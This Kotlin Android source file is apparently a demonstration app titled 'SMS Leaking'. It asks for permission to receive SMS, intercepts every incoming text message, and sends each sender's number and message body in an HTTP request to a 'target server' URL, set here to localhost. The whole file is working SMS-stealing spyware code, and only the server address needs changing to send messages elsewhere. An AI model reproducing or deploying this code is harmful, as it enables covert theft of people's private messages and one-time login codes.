package br.viictorjj.sms_leaking

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material.MaterialTheme
import androidx.compose.material.Surface
import androidx.compose.material.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import br.viictorjj.sms_leaking.ui.theme.Sms_leakingTheme
import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.telephony.SmsMessage
import androidx.compose.foundation.layout.wrapContentSize
import androidx.compose.ui.Alignment
import androidx.compose.ui.text.font.FontWeight
import okhttp3.Request
import okhttp3.OkHttpClient
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.Response

/*
    author: joaojj

    This application is a small demonstration of an SMS intercept made in Kotlin to send to the target's server
 */


class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            Sms_leakingTheme {
                Surface(
                    modifier = Modifier.fillMaxSize().wrapContentSize(Alignment.Center),
                    color = MaterialTheme.colors.background,
                ) {
                    Message(name = "SMS Leaking")
                }
            }
        }
        // Registering SMS Receive permission
        val permission = Manifest.permission.RECEIVE_SMS
        if(ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), 0)
        } else {
            startSmsListerner()
        }
    }

    private fun startSmsListerner() {
        val smsReceiver = SmsReceiver()
        // Registering the filter that we will capture
        val intentFilter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        // this line registers the smsReceiver to receive intents with the action "android.provider.Telephony.SMS_RECEIVED". When an SMS message is received by the Android system, it issues an intent with this action, and the smsReceiver will be triggered to process the message.
        registerReceiver(smsReceiver, intentFilter)
    }

    class SmsReceiver : BroadcastReceiver() {
        private val SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED"

        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == SMS_RECEIVED) {
                val bundle = intent.extras
                if(bundle != null) {
                    val pdus = bundle.get("pdus") as Array<*> // In the context of SMS messages, "pdu" is a common key used to store the Protocol Data Units (PDUs) of SMS messages.
                    for (i in pdus.indices) { // This starts a for loop that loops through all the PDUs in the array. The loop allows you to process each SMS message received.
                        val smsMessage = SmsMessage.createFromPdu(pdus[i] as ByteArray) // Inside the loop, each PDU is converted to an SmsMessage object. This is done using the static createFromPdu method of the SmsMessage class. The pdus[i] is converted to ByteArray, and this byte array is used to create the SmsMessage.
                        val smsBody  = smsMessage.messageBody
                        val address = smsMessage.originatingAddress
                        CoroutineScope(Dispatchers.IO).launch { // Starting coroutines
                            Request(address, smsBody)
                        }
                    }
                }
            }
        }

        /* Making the request to receive message data */
        private fun Request(address: String?, smsBody: String) {
            val client = OkHttpClient()

            val request = Request.Builder()
                .url("http://127.0.0.1:3030/$address/$smsBody")  // Target server
                .build()
            try {
                val response : Response = client.newCall(request).execute()
                val responseBody = response.body?.string()
            }catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}

@Composable
fun Message(name: String) {
    Text(name, style = MaterialTheme.typography.h2.copy(fontWeight = FontWeight.Bold))
}